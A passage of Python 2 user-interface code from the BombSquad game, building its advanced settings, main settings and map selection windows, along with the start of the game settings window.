        self._promoCodeButton = bs.buttonWidget(
            parent=self._subContainer,
            position=(self._subWidth / 2 - thisButtonWidth / 2, v - 14),
            size=(thisButtonWidth, 60),
            autoSelect=True, label=bs.Lstr(
                resource=self._r + '.enterPromoCodeText'),
            textScale=1.0, onActivateCall=self._onPromoCodePress)
        if self._backButton is not None:
            bs.widget(
                edit=self._promoCodeButton, upWidget=self._backButton,
                leftWidget=self._backButton)
        v -= self._extraButtonSpacing * 0.8

        t = bs.textWidget(
            parent=self._subContainer, position=(200, v + 10),
            size=(0, 0),
            text=bs.Lstr(resource=self._r + '.languageText'),
            maxWidth=150, scale=0.95, color=gTitleColor, hAlign='right',
            vAlign='center')

        languages = bsUtils._getLanguages()
        curLang = bs.getLanguage(returnNoneForDefault=True)
        if curLang is None:
            curLang = 'Auto'

        # we have a special dict of language names in that language
        # so we dont have to import every language module here..
        # (that causes hitches on slower systems)
        langsTranslated = {}
        for lang in languages:
            langsTranslated[lang] = lang  # default
            if lang in bsServerData.languageNamesTranslated:
                langsTranslated[lang] = bs.uni(
                    bsServerData.languageNamesTranslated[lang])

        langsFull = {}
        for lang in languages:
            lt = bs.Lstr(translate=('languages', lang)).evaluate()
            if langsTranslated[lang] == lt:
                langsFull[lang] = lt
            else:
                langsFull[lang] = langsTranslated[lang]+' ('+lt+')'

        self._languagePopup = PopupMenu(
            parent=self._subContainer, position=(210, v - 19),
            width=150, openingCall=bs.WeakCall(self._onMenuOpen),
            closingCall=bs.WeakCall(self._onMenuClose),
            autoSelect=False, onValueChangeCall=bs.WeakCall(
                self._onMenuChoice),
            choices=['Auto'] + languages, buttonSize=(250, 60),
            choicesDisplay=([bs.Lstr(
                value=(bs.Lstr(resource='autoText').evaluate()
                       + ' (' + bs.Lstr(
                    translate=('languages', bsUtils.
                               _getDefaultLanguage())).
                       evaluate() + ')'))] +
                [bs.Lstr(value=langsFull[l]) for l in languages]),
            currentChoice=curLang)

        v -= self._spacing * 1.8

        t = bs.textWidget(
            parent=self._subContainer, position=(self._subWidth * 0.5, v + 10),
            size=(0, 0),
            text=bs.Lstr(
                resource=self._r + '.helpTranslateText',
                subs=[('${APP_NAME}', bs.Lstr(resource='titleText'))]),
            maxWidth=self._subWidth * 0.9, maxHeight=55, flatness=1.0,
            scale=0.65, color=(0.4, 0.9, 0.4, 0.8),
            hAlign='center', vAlign='center')
        v -= self._spacing * 1.9
        thisButtonWidth = 410
        self._translationEditorButton = bs.buttonWidget(
            parent=self._subContainer,
            position=(self._subWidth / 2 - thisButtonWidth / 2, v - 24),
            size=(thisButtonWidth, 60),
            label=bs.Lstr(
                resource=self._r + '.translationEditorButtonText',
                subs=[('${APP_NAME}', bs.Lstr(resource='titleText'))]),
            autoSelect=True, onActivateCall=bs.Call(
                bs.openURL, 'http://bombsquadgame.com/translate'))

        self._langStatusText = bs.textWidget(
            parent=self._subContainer, position=(self._subWidth * 0.5, v - 40),
            size=(0, 0),
            text='', flatness=1.0, scale=0.63, hAlign='center', vAlign='center',
            maxWidth=400.0)
        self._updateLangStatus()
        v -= 40

        langInform = bsInternal._getAccountMiscVal('langInform', False)

        self._languageInformCheckBox = cb = bs.checkBoxWidget(
            parent=self._subContainer, position=(50, v - 50),
            size=(self._subWidth - 100, 30),
            autoSelect=True, maxWidth=430, textColor=(0.8, 0.8, 0.8),
            value=langInform, text=bs.Lstr(
                resource=self._r + '.translationInformMe'),
            onValueChangeCall=bs.WeakCall(self._onLangInformValueChange))

        bs.widget(edit=self._translationEditorButton, downWidget=cb,
                  upWidget=self._languagePopup.getButtonWidget())

        v -= self._spacing * 3.0

        self._kickIdlePlayersCheckBox = configCheckBox(
            parent=self._subContainer, position=(50, v),
            size=(self._subWidth - 100, 30),
            name="Kick Idle Players", autoSelect=True, displayName=bs.Lstr(
                resource=self._r + '.kickIdlePlayersText'),
            scale=1.0, maxWidth=430)

        if self._showAlwaysUseInternalKeyboard:
            v -= 42
            self._alwaysUseInternalKeyboardCheckBox = configCheckBox(
                parent=self._subContainer, position=(50, v),
                size=(self._subWidth - 100, 30),
                name="Always Use Internal Keyboard", autoSelect=True,
                displayName=bs.Lstr(
                    resource=self._r + '.alwaysUseInternalKeyboardText'),
                scale=1.0, maxWidth=430)
            t = bs.textWidget(
                parent=self._subContainer, position=(90, v - 10),
                size=(0, 0),
                text=bs.Lstr(
                    resource=self._r +
                    '.alwaysUseInternalKeyboardDescriptionText'),
                maxWidth=400, flatness=1.0, scale=0.65,
                color=(0.4, 0.9, 0.4, 0.8),
                hAlign='left', vAlign='center')
            v -= 20
        else:
            self._alwaysUseInternalKeyboardCheckBox = None

        v -= self._spacing * 2.1

        thisButtonWidth = 410
        self._showUserModsButton = bs.buttonWidget(
            parent=self._subContainer,
            position=(self._subWidth / 2 - thisButtonWidth / 2, v - 10),
            size=(thisButtonWidth, 60),
            autoSelect=True, label=bs.Lstr(
                resource=self._r + '.showUserModsText'),
            textScale=1.0, onActivateCall=bsUtils.showUserScripts)
        if self._showAlwaysUseInternalKeyboard:
            bs.widget(edit=self._alwaysUseInternalKeyboardCheckBox,
                      downWidget=self._showUserModsButton)
            bs.widget(
                edit=self._showUserModsButton,
                upWidget=self._alwaysUseInternalKeyboardCheckBox)
        else:
            bs.widget(
                edit=self._showUserModsButton,
                upWidget=self._kickIdlePlayersCheckBox)
            bs.widget(edit=self._kickIdlePlayersCheckBox,
                      downWidget=self._showUserModsButton)

        v -= self._spacing * 2.0

        b = self._moddingGuideButton = bs.buttonWidget(
            parent=self._subContainer,
            position=(self._subWidth / 2 - thisButtonWidth / 2, v - 10),
            size=(thisButtonWidth, 60),
            autoSelect=True, label=bs.Lstr(
                resource=self._r + '.moddingGuideText'),
            textScale=1.0, onActivateCall=bs.Call(
                bs.openURL,
                'http://www.froemling.net/docs/bombsquad-modding-guide'))

        v -= self._spacing * 1.8

        def foo(val):
            bs.screenMessage(bs.Lstr(resource=self._r+'.mustRestartText'),
                             color=(1, 1, 0))

        cb = self._enablePackageModsCheckBox = configCheckBox(
            parent=self._subContainer, position=(80, v),
            size=(self._subWidth - 100, 30),
            name="Enable Package Mods", autoSelect=True, valueChangeCall=foo,
            displayName=bs.Lstr(
                resource=self._r + '.enablePackageModsText'),
            scale=1.0, maxWidth=400)
        bs.widget(edit=b, downWidget=cb)
        bs.widget(edit=cb, upWidget=b)
        t = bs.textWidget(
            parent=self._subContainer, position=(90, v - 10),
            size=(0, 0),
            text=bs.Lstr(
                resource=self._r + '.enablePackageModsDescriptionText'),
            maxWidth=400, flatness=1.0, scale=0.65, color=(0.4, 0.9, 0.4, 0.8),
            hAlign='left', vAlign='center')

        v -= self._spacing * 0.6

        if self._doVRTestButton:
            v -= self._extraButtonSpacing
            self._vrTestButton = bs.buttonWidget(
                parent=self._subContainer,
                position=(self._subWidth / 2 - thisButtonWidth / 2, v - 14),
                size=(thisButtonWidth, 60),
                autoSelect=True, label=bs.Lstr(
                    resource=self._r + '.vrTestingText'),
                textScale=1.0, onActivateCall=self._onVRTestPress)
        else:
            self._vrTestButton = None

        if self._doNetTestButton:
            v -= self._extraButtonSpacing
            self._netTestButton = bs.buttonWidget(
                parent=self._subContainer,
                position=(self._subWidth / 2 - thisButtonWidth / 2, v - 14),
                size=(thisButtonWidth, 60),
                autoSelect=True, label=bs.Lstr(
                    resource=self._r + '.netTestingText'),
                textScale=1.0, onActivateCall=self._onNetTestPress)
        else:
            self._netTestButton = None

        v -= 70
        self._benchmarksButton = bs.buttonWidget(
            parent=self._subContainer,
            position=(self._subWidth / 2 - thisButtonWidth / 2, v - 14),
            size=(thisButtonWidth, 60),
            autoSelect=True, label=bs.Lstr(
                resource=self._r + '.benchmarksText'),
            textScale=1.0, onActivateCall=self._onBenchmarkPress)

        bs.widget(edit=self._vrTestButton
                  if self._vrTestButton is not None else self._netTestButton
                  if self._netTestButton is not None else
                  self._benchmarksButton, upWidget=cb)

        for w in self._subContainer.getChildren():
            bs.widget(edit=w, showBufferBottom=30, showBufferTop=20)

        if gToolbars:
            pb = bsInternal._getSpecialWidget('partyButton')
            bs.widget(edit=self._scrollWidget, rightWidget=pb)
            if self._backButton is None:
                bs.widget(
                    edit=self._scrollWidget,
                    leftWidget=bsInternal._getSpecialWidget('backButton'))

        self._restore_state()

    def _onLangInformValueChange(self, val):
        bsInternal._addTransaction(
            {'type': 'SET_MISC_VAL', 'name': 'langInform', 'value': val})
        bsInternal._runTransactions()

    def _onVRTestPress(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = VRTestingWindow(
            transition='inRight').getRootWidget()

    def _onNetTestPress(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = NetTestingWindow(
            transition='inRight').getRootWidget()

    def _onFriendPromoCodePress(self):
        if bsInternal._getAccountState() != 'SIGNED_IN':
            showSignInPrompt()
            return
        doAppInvitesPress()

    def _onPromoCodePress(self):

        # we have to be logged in for promo-codes to work..
        if bsInternal._getAccountState() != 'SIGNED_IN':
            showSignInPrompt()
            return

        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = PromoCodeWindow(
            originWidget=self._promoCodeButton).getRootWidget()

    def _onBenchmarkPress(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = DebugWindow(
            transition='inRight').getRootWidget()

    def _save_state(self):
        try:
            sel = self._rootWidget.getSelectedChild()
            if sel == self._scrollWidget:
                sel = self._subContainer.getSelectedChild()
                if sel == self._vrTestButton:
                    selName = 'VRTest'
                elif sel == self._netTestButton:
                    selName = 'NetTest'
                elif sel == self._promoCodeButton:
                    selName = 'PromoCode'
                elif sel == self._benchmarksButton:
                    selName = 'Benchmarks'
                elif sel == self._kickIdlePlayersCheckBox:
                    selName = 'KickIdlePlayers'
                elif sel == self._alwaysUseInternalKeyboardCheckBox:
                    selName = 'AlwaysUseInternalKeyboard'
                elif sel == self._languagePopup.getButtonWidget():
                    selName = 'Languages'
                elif sel == self._translationEditorButton:
                    selName = 'TranslationEditor'
                elif sel == self._showUserModsButton:
                    selName = 'ShowUserMods'
                elif sel == self._moddingGuideButton:
                    selName = 'ModdingGuide'
                elif sel == self._enablePackageModsCheckBox:
                    selName = 'PackageMods'
                elif sel == self._languageInformCheckBox:
                    selName = 'LangInform'
                else:
                    raise Exception("unrecognized selection")
            elif sel == self._backButton:
                selName = 'Back'
            else:
                raise Exception("unrecognized selection")
            gWindowStates[self.__class__.__name__] = {'selName': selName}
        except Exception:
            bs.printException('error saving state for', self.__class__)

    def _restore_state(self):
        try:
            try:
                selName = gWindowStates[self.__class__.__name__]['selName']
            except Exception:
                selName = None
            if selName == 'Back':
                sel = self._backButton
                subSel = None
            else:
                bs.containerWidget(edit=self._rootWidget,
                                   selectedChild=self._scrollWidget)
                if selName == 'VRTest':
                    sel = self._vrTestButton
                elif selName == 'NetTest':
                    sel = self._netTestButton
                elif selName == 'PromoCode':
                    sel = self._promoCodeButton
                elif selName == 'Benchmarks':
                    sel = self._benchmarksButton
                elif selName == 'KickIdlePlayers':
                    sel = self._kickIdlePlayersCheckBox
                elif selName == 'AlwaysUseInternalKeyboard':
                    sel = self._alwaysUseInternalKeyboardCheckBox
                elif selName == 'Languages':
                    sel = self._languagePopup.getButtonWidget()
                elif selName == 'TranslationEditor':
                    sel = self._translationEditorButton
                elif selName == 'ShowUserMods':
                    sel = self._showUserModsButton
                elif selName == 'ModdingGuide':
                    sel = self._moddingGuideButton
                elif selName == 'PackageMods':
                    sel = self._enablePackageModsCheckBox
                elif selName == 'LangInform':
                    sel = self._languageInformCheckBox
                else:
                    sel = None
                if sel != None:
                    bs.containerWidget(
                        edit=self._subContainer, selectedChild=sel,
                        visibleChild=sel)
        except Exception:
            bs.printException('error restoring state for', self.__class__)

    def _onMenuOpen(self):
        self._menuOpen = True

    def _onMenuClose(self):
        self._menuOpen = False

    def _onMenuChoice(self, choice):
        if choice == 'Auto':
            bsUtils._setLanguage(None)
        else:
            try:
                # attempt to reload the language module first.. (this makes
                # iterating on a language easier)
                langModule = __import__('bsLanguage'+choice)
                reload(langModule)
            except Exception:
                bs.printException(
                    'error on language switch reload for lang \'' + choice +
                    '\':')
            bsUtils._setLanguage(choice)
        self._save_state()
        bs.realTimer(100, bs.WeakCall(self._rebuild))

    def _completedLangsCB(self, results):
        if results is not None and results['langs'] is not None:
            self._completeLangsList = results['langs']
            self._completeLangsError = False
        else:
            self._completeLangsList = None
            self._completeLangsError = True
        bs.realTimer(1, bs.WeakCall(self._updateLangStatus))

    def _doBack(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        uiGlobals['mainMenuWindow'] = SettingsWindow(
            transition='inLeft').getRootWidget()


class SettingsWindow(Window):

    def __init__(self, transition='inRight', originWidget=None):

        bsInternal._setAnalyticsScreen('Settings Window')

        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None

        width = 900 if gSmallUI else 580
        xInset = 75 if gSmallUI else 0
        height = 435

        buttonHeight = 42

        self._r = 'settingsWindow'

        topExtra = 20 if gSmallUI else 0
        self._rootWidget = bs.containerWidget(
            size=(width, height + topExtra),
            transition=transition, toolbarVisibility='MENU_MINIMAL',
            scaleOriginStackOffset=scaleOrigin, scale=1.75
            if gSmallUI else 1.35 if gMedUI else 1.0, stackOffset=(0, -8)
            if gSmallUI else(0, 0))

        if gToolbars and gSmallUI:
            self._backButton = None
            bs.containerWidget(edit=self._rootWidget, onCancelCall=self._doBack)
        else:
            self._backButton = b = bs.buttonWidget(
                parent=self._rootWidget, autoSelect=True,
                position=(40 + xInset, height - 55),
                size=(130, 60),
                scale=0.8, textScale=1.2, label=bs.Lstr(
                    resource='backText'),
                buttonType='back', onActivateCall=self._doBack)
            bs.containerWidget(edit=self._rootWidget, cancelButton=b)

        t = bs.textWidget(
            parent=self._rootWidget, position=(0, height - 44),
            size=(width, 25),
            text=bs.Lstr(resource=self._r + '.titleText'),
            color=gTitleColor, hAlign="center", vAlign="center", maxWidth=130)

        if gDoAndroidNav:
            if self._backButton is not None:
                bs.buttonWidget(
                    edit=self._backButton, buttonType='backSmall', size=(
                        60, 60), label=bs.getSpecialChar('back'))

        # remind existing players that we moved this for about 10 launches...
        bsConfig = bs.getConfig()
        lc14146 = bsConfig.get('lc14146', 0)
        lcSince = bsConfig.get('launchCount', 0) - lc14146
        showAccountsMoved = True if lc14146 > 1 and lcSince < 10 else False
        if showAccountsMoved:
            t = bs.textWidget(
                parent=self._rootWidget,
                position=(width * 0.5, 50 if gSmallUI else 35),
                size=(0, 0),
                text=bs.Lstr(resource=self._r + '.playerProfilesMovedText'),
                color=gInfoTextColor, flatness=1.0, scale=0.5, hAlign="center",
                vAlign="center", maxWidth=width * 0.8)

        v = height - 80
        v -= 140 if gSmallUI and showAccountsMoved else 145

        bw = 280 if gSmallUI else 230
        bh = 160 if gSmallUI and showAccountsMoved else 170
        xOffs = xInset + (105 if gSmallUI else 72) - bw  # now unused
        xOffs2 = xOffs+bw-7
        xOffs3 = xOffs+2*(bw-7)
        xOffs4 = xOffs2
        xOffs5 = xOffs3

        def _bTitle(x, y, button, text):
            bs.textWidget(
                parent=self._rootWidget, text=text,
                position=(x + bw * 0.47, y + bh * 0.22),
                maxWidth=bw * 0.7, size=(0, 0),
                hAlign='center', vAlign='center', drawController=button,
                color=(0.7, 0.9, 0.7, 1.0))

        cb = self._controllersButton = b = bs.buttonWidget(
            parent=self._rootWidget, autoSelect=True, position=(xOffs2, v),
            size=(bw, bh),
            buttonType='square', label='', onActivateCall=self._doControllers)
        if gToolbars and self._backButton is None:
            pb = bsInternal._getSpecialWidget('backButton')
            bs.widget(edit=cb, leftWidget=pb)
        _bTitle(xOffs2, v, cb,
                bs.Lstr(resource=self._r+'.controllersText'))
        iw = ih = 130
        bs.imageWidget(
            parent=self._rootWidget,
            position=(xOffs2 + bw * 0.49 - iw * 0.5, v + 35),
            size=(iw, ih),
            texture=bs.getTexture('controllerIcon'),
            drawController=cb)

        gb = self._graphicsButton = b = bs.buttonWidget(
            parent=self._rootWidget, autoSelect=True, position=(xOffs3, v),
            size=(bw, bh),
            buttonType='square', label='', onActivateCall=self._doGraphics)
        if gToolbars:
            pb = bsInternal._getSpecialWidget('partyButton')
            bs.widget(edit=gb, upWidget=pb, rightWidget=pb)
        _bTitle(xOffs3, v, gb,
                bs.Lstr(resource=self._r+'.graphicsText'))
        iw = ih = 110
        bs.imageWidget(
            parent=self._rootWidget,
            position=(xOffs3 + bw * 0.49 - iw * 0.5, v + 42),
            size=(iw, ih),
            texture=bs.getTexture('graphicsIcon'),
            drawController=gb)

        v -= (bh-5)

        ab = self._audioButton = b = bs.buttonWidget(
            parent=self._rootWidget, autoSelect=True, position=(xOffs4, v),
            size=(bw, bh),
            buttonType='square', label='', onActivateCall=self._doAudio)
        _bTitle(xOffs4, v, ab,
                bs.Lstr(resource=self._r+'.audioText'))
        iw = ih = 120
        bs.imageWidget(
            parent=self._rootWidget,
            position=(xOffs4 + bw * 0.49 - iw * 0.5 + 5, v + 35),
            size=(iw, ih),
            color=(1, 1, 0),
            texture=bs.getTexture('audioIcon'),
            drawController=ab)

        avb = self._advancedButton = b = bs.buttonWidget(
            parent=self._rootWidget, autoSelect=True, position=(xOffs5, v),
            size=(bw, bh),
            buttonType='square', label='', onActivateCall=self._doAdvanced)
        _bTitle(xOffs5, v, avb,
                bs.Lstr(resource=self._r+'.advancedText'))
        iw = ih = 120
        bs.imageWidget(
            parent=self._rootWidget,
            position=(xOffs5 + bw * 0.49 - iw * 0.5 + 5, v + 35),
            size=(iw, ih),
            color=(0.8, 0.95, 1),
            texture=bs.getTexture('advancedIcon'),
            drawController=avb)

    def _doBack(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        uiGlobals['mainMenuWindow'] = MainMenuWindow(
            transition='inLeft').getRootWidget()

    def _doControllers(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = ControllersWindow(
            originWidget=self._controllersButton).getRootWidget()

    def _doGraphics(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = GraphicsWindow(
            originWidget=self._graphicsButton).getRootWidget()

    def _doAudio(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = ConfigAudioWindow(
            originWidget=self._audioButton).getRootWidget()

    def _doAdvanced(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = AdvancedSettingsWindow(
            originWidget=self._advancedButton).getRootWidget()

    def _save_state(self):
        try:
            sel = self._rootWidget.getSelectedChild()
            if sel == self._controllersButton:
                selName = 'Controllers'
            elif sel == self._graphicsButton:
                selName = 'Graphics'
            elif sel == self._audioButton:
                selName = 'Audio'
            elif sel == self._advancedButton:
                selName = 'Advanced'
            elif sel == self._backButton:
                selName = 'Back'
            else:
                raise Exception("unrecognized selection")
            gWindowStates[self.__class__.__name__] = {'selName': selName}
        except Exception:
            bs.printException('error saving state for', self.__class__)

    def _restore_state(self):
        try:
            try:
                selName = gWindowStates[self.__class__.__name__]['selName']
            except Exception:
                selName = None
            if selName == 'Controllers':
                sel = self._controllersButton
            elif selName == 'Graphics':
                sel = self._graphicsButton
            elif selName == 'Audio':
                sel = self._audioButton
            elif selName == 'Advanced':
                sel = self._advancedButton
            elif selName == 'Back':
                sel = self._backButton
            else:
                sel = self._controllersButton
            bs.containerWidget(edit=self._rootWidget, selectedChild=sel)
        except Exception:
            bs.printException('error restoring state for', self.__class__)


class SelectMapWindow(Window):

    def __init__(
            self, gameClass, sessionType, config, editInfo, completionCall,
            transition='inRight'):

        self._gameClass = gameClass
        self._sessionType = sessionType
        self._config = config
        self._completionCall = completionCall
        self._editInfo = editInfo

        try:
            self._previousMap = bsMap.getFilteredMapName(
                config['settings']['map'])
        except Exception:
            self._previousMap = ''

        width = 715 if gSmallUI else 615
        xInset = 50 if gSmallUI else 0
        height = 400 if gSmallUI else 480 if gMedUI else 600
        spacing = 40

        topExtra = 20 if gSmallUI else 0
        self._rootWidget = bs.containerWidget(
            size=(width, height + topExtra),
            transition=transition, scale=2.17
            if gSmallUI else 1.3 if gMedUI else 1.0, stackOffset=(0, -27)
            if gSmallUI else(0, 0))

        self._cancelButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(38 + xInset, height - 67),
            size=(140, 50),
            scale=0.9, textScale=1.0, autoSelect=True, label=bs.Lstr(
                resource='cancelText'),
            onActivateCall=self._cancel)

        bs.containerWidget(edit=self._rootWidget, cancelButton=b)
        t = bs.textWidget(
            parent=self._rootWidget,
            position=(width*0.5, height-46), size=(0, 0),
            maxWidth=260, scale=1.1,
            text=bs.Lstr(resource='mapSelectTitleText', subs=[
                ('${GAME}', self._gameClass.getDisplayString())]),
            color=gTitleColor,
            hAlign="center", vAlign="center")
        v = height - 70
        self._scrollWidth = width-(80+2*xInset)
        self._scrollHeight = height - 140

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget,
            position=(40 + xInset, v - self._scrollHeight),
            size=(self._scrollWidth, self._scrollHeight))
        bs.containerWidget(edit=self._rootWidget,
                           selectedChild=self._scrollWidget)
        bs.containerWidget(edit=self._scrollWidget, claimsLeftRight=True)

        self._subContainer = None
        self._refresh()

    def _refresh(self, selectGetMoreMapsButton=False):

        # kill old
        if self._subContainer is not None:
            self._subContainer.delete()

        modelOpaque = bs.getModel('levelSelectButtonOpaque')
        modelTransparent = bs.getModel('levelSelectButtonTransparent')

        self._maps = []
        mapList = self._gameClass.getSupportedMaps(self._sessionType)
        mapListSorted = list(mapList)
        mapListSorted.sort()

        unOwnedMaps = bsMap._getUnOwnedMaps()

        for m in mapListSorted:
            # disallow ones we don't own
            if m in unOwnedMaps:
                continue
            mapTexName = bsMap.getMapClass(m).getPreviewTextureName()
            if mapTexName is not None:
                try:
                    mapTex = bs.getTexture(mapTexName)
                    self._maps.append((m, mapTex))
                except Exception:
                    print 'invalid map preview texture: "'+mapTexName+'"'
            else:
                print 'Error: no map preview texture for map:', m

        count = len(self._maps)
        columns = 2
        rows = int(math.ceil(float(count)/columns))
        buttonWidth = 220
        buttonHeight = buttonWidth * 0.5
        buttonBufferH = 16
        buttonBufferV = 19
        self._subWidth = self._scrollWidth*0.95
        self._subHeight = 5+rows*(buttonHeight+2*buttonBufferV) + 100
        self._subContainer = bs.containerWidget(
            parent=self._scrollWidget, size=(
                self._subWidth, self._subHeight), background=False)
        index = 0
        maskTexture = bs.getTexture('mapPreviewMask')
        hOffs = 130 if len(self._maps) == 1 else 0
        for y in range(rows):
            for x in range(columns):
                pos = (x*(buttonWidth+2*buttonBufferH)+buttonBufferH+hOffs,
                       self._subHeight - (y+1)*(buttonHeight+2*buttonBufferV)
                       +12)
                b = bs.buttonWidget(parent=self._subContainer,
                                    buttonType='square',
                                    size=(buttonWidth, buttonHeight),
                                    autoSelect=True, texture=self._maps
                                    [index][1],
                                    maskTexture=maskTexture,
                                    modelOpaque=modelOpaque,
                                    modelTransparent=modelTransparent, label='',
                                    color=(1, 1, 1),
                                    onActivateCall=bs.Call(
                                        self._selectWithDelay, self._maps
                                        [index][0]),
                                    position=pos)
                if x == 0:
                    bs.widget(edit=b, leftWidget=self._cancelButton)
                if y == 0:
                    bs.widget(edit=b, upWidget=self._cancelButton)
                if x == columns-1 and gToolbars:
                    bs.widget(
                        edit=b, rightWidget=bsInternal._getSpecialWidget(
                            "partyButton"))

                bs.widget(edit=b, showBufferTop=60, showBufferBottom=60)
                if self._maps[index][0] == self._previousMap:
                    bs.containerWidget(
                        edit=self._subContainer, selectedChild=b,
                        visibleChild=b)
                name = bsMap.getMapDisplayString(self._maps[index][0])
                bs.textWidget(
                    parent=self._subContainer, text=name,
                    position=(pos[0] + buttonWidth * 0.5, pos[1] - 12),
                    size=(0, 0),
                    scale=0.5, maxWidth=buttonWidth, drawController=b,
                    hAlign='center', vAlign='center',
                    color=(0.8, 0.8, 0.8, 0.8))
                index += 1

                if index >= count:
                    break
            if index >= count:
                break
        self._getMoreMapsButton = b = bs.buttonWidget(
            parent=self._subContainer, size=(self._subWidth * 0.8, 60),
            position=(self._subWidth * 0.1, 30),
            label=bs.Lstr(resource='mapSelectGetMoreMapsText'),
            onActivateCall=self._onStorePress, color=(0.6, 0.53, 0.63),
            textColor=(0.75, 0.7, 0.8),
            autoSelect=True)
        bs.widget(edit=b, showBufferTop=30, showBufferBottom=30)
        if selectGetMoreMapsButton:
            bs.containerWidget(edit=self._subContainer,
                               selectedChild=b, visibleChild=b)

    def _onStorePress(self):
        if bsInternal._getAccountState() != 'SIGNED_IN':
            showSignInPrompt()
            return
        StoreWindow(
            modal=True, showTab='maps', onCloseCall=self._onStoreClose,
            originWidget=self._getMoreMapsButton)

    def _onStoreClose(self):
        self._refresh(selectGetMoreMapsButton=True)

    def _select(self, mapName):
        self._config['settings']['map'] = mapName
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        uiGlobals['mainMenuWindow'] = GameSettingsSelectWindow(
            self._gameClass, self._sessionType, self._config, self.
            _completionCall, defaultSelection='map', transition='inLeft',
            editInfo=self._editInfo).getRootWidget()

    def _selectWithDelay(self, mapName):
        bsInternal._lockAllInput()
        bs.realTimer(100, bsInternal._unlockAllInput)
        bs.realTimer(100, bs.WeakCall(self._select, mapName))

    def _cancel(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        uiGlobals['mainMenuWindow'] = GameSettingsSelectWindow(
            self._gameClass, self._sessionType, self._config, self.
            _completionCall, defaultSelection='map', transition='inLeft',
            editInfo=self._editInfo).getRootWidget()


class GameSettingsSelectWindow(Window):

    def __init__(self, gameClass, sessionType, config, completionCall,
                 defaultSelection=None, transition='inRight', editInfo=None):
        self._gameClass = gameClass
        self._sessionType = sessionType

        # if we're within an editing session we get passed editInfo
        # (returning from map selection window, etc)
        if editInfo is not None:
            self._editInfo = editInfo
        # ..otherwise determine whether we're adding or editing a game based
        # on whether an existing config was passed to us
        else:
            if config is None:
                self._editInfo = {'editType': 'add'}
            else:
                self._editInfo = {'editType': 'edit'}

        self._r = 'gameSettingsWindow'

        validMaps = gameClass.getSupportedMaps(sessionType)
        if len(validMaps) == 0:
            bs.screenMessage(bs.Lstr(resource='noValidMapsErrorText'))
            raise Exception("No valid maps")

        self._settingsDefs = gameClass.getSettings(sessionType)
        self._completionCall = completionCall

        # to start with, pick a random map out of the ones we own
        unOwnedMaps = bsMap._getUnOwnedMaps()
        validMapsOwned = [m for m in validMaps if m not in unOwnedMaps]
        if validMapsOwned:
            self._map = validMaps[random.randrange(len(validMapsOwned))]
        # hmmm.. we own none of these maps.. just pick a random un-owned one
        # i guess.. should this ever happen?..
        else:
            self._map = validMaps[random.randrange(len(validMaps))]

        isAdd = (self._editInfo['editType'] == 'add')

        # if there's a valid map name in the existing config, use that.
        try:
            if (config is not None and 'settings' in config
                    and 'map' in config['settings']):
                filteredMapName = bsMap.getFilteredMapName(
                    config['settings']['map'])
                if filteredMapName in validMaps:
                    self._map = filteredMapName
        except Exception:
            bs.printException('exception getting map for editor')

        if config is not None and 'settings' in config:
            self._settings = config['settings']
        else:
            self._settings = {}

        self._choiceSelections = {}

        width = 720 if gSmallUI else 620
        xInset = 50 if gSmallUI else 0
        height = 365 if gSmallUI else 460 if gMedUI else 550
        spacing = 52
        yExtra = 15
        yExtra2 = 21

        mapTexName = bsMap.getMapClass(self._map).getPreviewTextureName()
        if mapTexName is None:
            raise Exception("no map preview tex found for"+self._map)
        mapTex = bs.getTexture(mapTexName)

        topExtra = 20 if gSmallUI else 0
        self._rootWidget = bs.containerWidget(
            size=(width, height + topExtra),
            transition=transition, scale=2.19
            if gSmallUI else 1.35 if gMedUI else 1.0, stackOffset=(0, -17)
            if gSmallUI else(0, 0))

        b = bs.buttonWidget(parent=self._rootWidget,
                            position=(45 + xInset, height - 82 + yExtra2),
                            size=(180, 70) if isAdd else(180, 65),
                            label=bs.Lstr(resource='backText')
                            if isAdd else bs.Lstr(resource='cancelText'),
                            buttonType='back' if isAdd else None,
                            autoSelect=True, scale=0.75, textScale=1.3,
                            onActivateCall=bs.Call(self._cancel))
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)

        addButton = b = bs.buttonWidget(
            parent=self._rootWidget,
            position=(width - (193 + xInset),
                      height - 82 + yExtra2),
            size=(200, 65),
            scale=0.75, textScale=1.3, label=bs.Lstr(
                resource=self._r + '.addGameText')
            if isAdd else bs.Lstr(resource='doneText'))

        if gToolbars:
            pb = bsInternal._getSpecialWidget('partyButton')
            bs.widget(edit=addButton, rightWidget=pb, upWidget=pb)

        t = bs.textWidget(parent=self._rootWidget,
                          position=(-8, height - 70 + yExtra2),
                          size=(width, 25),
                          text=gameClass.getDisplayString(),
                          color=gTitleColor, maxWidth=235, scale=1.1,
                          hAlign="center", vAlign="center")

        mapHeight = 100

        scrollHeight = mapHeight + 10  # map select and margin
        # calc our total height we'll need
        for settingName, setting in self._settingsDefs:
            scrollHeight += spacing

        scrollWidth = width-(86+2*xInset)
        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, position=(44+xInset, 35+yExtra),
            size=(scrollWidth, height-116), highlight=False)
        self._subContainer = c = bs.containerWidget(
            parent=self._scrollWidget, size=(scrollWidth, scrollHeight),
